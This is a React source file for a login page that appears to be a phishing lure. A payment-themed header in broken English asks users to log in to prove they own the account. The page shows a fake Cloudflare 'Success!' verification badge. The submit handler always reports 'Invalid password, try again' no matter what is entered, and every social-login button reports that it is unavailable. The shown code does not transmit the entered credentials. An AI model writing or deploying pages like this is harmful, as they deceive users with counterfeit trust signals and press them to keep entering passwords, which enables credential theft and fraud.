import { useState } from "react";
import { useForm } from "react-hook-form";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Eye, EyeOff } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import KycLogo from "@/components/KycLogo";

interface LoginForm {
  email: string;
  password: string;
}

const LoginPage = () => {
  const [showPassword, setShowPassword] = useState(false);
  const { toast } = useToast();
  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm<LoginForm>();

  const onSubmit = (data: LoginForm) => {
    // Always show invalid password message
    toast({
      variant: "destructive",
      title: "Invalid Password",
      description: "Invalid password, try again",
    });
  };

  const handleSocialLogin = (provider: string) => {
    toast({
      variant: "destructive",
      title: "Not Available",
      description: "Option not available at the moment",
    });
  };

  return (
    <div className="min-h-screen bg-gradient-to-b from-slate-800 via-slate-700 to-slate-900 flex flex-col items-center justify-center px-6 py-8">
      <div className="w-full max-w-md">
        {/* Header Message */}
        <div className="text-center mb-8">
          <h1 className="text-white text-xl font-medium leading-relaxed">
            IN OTHER TO COMPLETE PAYMENT, KINDLY LOGIN TO YOUR ACCOUNT TO BE SURE YOU ARE THE RIGHT OWNER.
          </h1>
        </div>

        {/* KYC Logo */}
        <KycLogo />

        {/* Login Form */}
        <form onSubmit={handleSubmit(onSubmit)} className="space-y-6">
          {/* Email Field */}
          <div className="space-y-2">
            <Label htmlFor="email" className="text-white text-base font-medium">
              Email
            </Label>
            <Input
              id="email"
              type="email"
              placeholder="Enter your email"
              className="bg-slate-600/50 border-slate-500 text-white placeholder:text-slate-400 focus:border-blue-400 focus:ring-blue-400/20 h-12 text-base"
              {...register("email", {
                required: "Email is required",
                pattern: {
                  value: /^[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}$/i,
                  message: "Invalid email address",
                },
              })}
            />
            {errors.email && (
              <p className="text-red-400 text-sm">{errors.email.message}</p>
            )}
          </div>

          {/* Password Field */}
          <div className="space-y-2">
            <Label htmlFor="password" className="text-white text-base font-medium">
              Password
            </Label>
            <div className="relative">
              <Input
                id="password"
                type={showPassword ? "text" : "password"}
                placeholder="Enter your password"
                className="bg-slate-600/50 border-slate-500 text-white placeholder:text-slate-400 focus:border-blue-400 focus:ring-blue-400/20 h-12 text-base pr-12"
                {...register("password", {
                  required: "Password is required",
                })}
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute right-3 top-1/2 -translate-y-1/2 text-slate-400 hover:text-white transition-colors"
              >
                {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
              </button>
            </div>
            {errors.password && (
              <p className="text-red-400 text-sm">{errors.password.message}</p>
            )}
          </div>

          {/* Forgot Password Link */}
          <div className="text-left">
            <button
              type="button"
              className="text-blue-400 hover:text-blue-300 text-sm font-medium transition-colors"
              onClick={() => toast({
                title: "Forgot Password",
                description: "Please contact support for password recovery",
              })}
            >
              Forgot password?
            </button>
          </div>

          {/* Cloudflare Verification */}
          <div className="bg-slate-700/50 border border-slate-600 rounded-lg p-4">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-3">
                <div className="w-6 h-6 bg-green-500 rounded-full flex items-center justify-center">
                  <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
                    <path d="M13.5 4.5L6 12L2.5 8.5" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                  </svg>
                </div>
                <span className="text-white font-medium">Success!</span>
              </div>
              <div className="flex items-center gap-2">
                <div className="text-orange-400">
                  <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
                    <path d="M12 2L13.5 8.5L20 7L14.5 12L20 17L13.5 15.5L12 22L10.5 15.5L4 17L9.5 12L4 7L10.5 8.5L12 2Z"/>
                  </svg>
                </div>
                <div className="text-right">
                  <div className="text-white font-semibold text-sm">CLOUDFLARE</div>
                  <div className="text-slate-400 text-xs">
                    <span className="hover:underline cursor-pointer">Privacy</span> • <span className="hover:underline cursor-pointer">Terms</span>
                  </div>
                </div>
              </div>
            </div>
          </div>

          {/* Login Button */}
          <Button
            type="submit"
            className="w-full h-12 bg-gradient-to-r from-purple-500 to-blue-500 hover:from-purple-600 hover:to-blue-600 text-white font-semibold text-base rounded-lg transition-all duration-200"
          >
            Login
          </Button>

          {/* Social Login Options */}
          <div className="space-y-3">
            {/* Google Sign In */}
            <Button
              type="button"
              variant="outline"
              className="w-full h-12 bg-slate-600/30 border-slate-500 text-white hover:bg-slate-600/50 font-medium text-base"
              onClick={() => handleSocialLogin("Google")}
            >
              <svg className="w-5 h-5 mr-3" viewBox="0 0 24 24">
                <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
                <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
                <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
                <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
              </svg>
              Sign in with Google
            </Button>

            {/* Microsoft Sign In */}
            <Button
              type="button"
              variant="outline"
              className="w-full h-12 bg-slate-600/30 border-slate-500 text-white hover:bg-slate-600/50 font-medium text-base"
              onClick={() => handleSocialLogin("Microsoft")}
            >
              <svg className="w-5 h-5 mr-3" viewBox="0 0 24 24" fill="currentColor">
                <path d="M11.4 24H0V12.6h11.4V24zM24 24H12.6V12.6H24V24zM11.4 11.4H0V0h11.4v11.4zM24 11.4H12.6V0H24v11.4z"/>
              </svg>
              Sign in with Microsoft
            </Button>

            {/* Email Sign In */}
            <Button
              type="button"
              variant="outline"
              className="w-full h-12 bg-slate-600/30 border-slate-500 text-white hover:bg-slate-600/50 font-medium text-base"
              onClick={() => handleSocialLogin("Email")}
            >
              <svg className="w-5 h-5 mr-3" viewBox="0 0 24 24" fill="currentColor">
                <path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/>
              </svg>
              Sign in with Email
            </Button>
          </div>
        </form>
      </div>
    </div>
  );
};

export default LoginPage;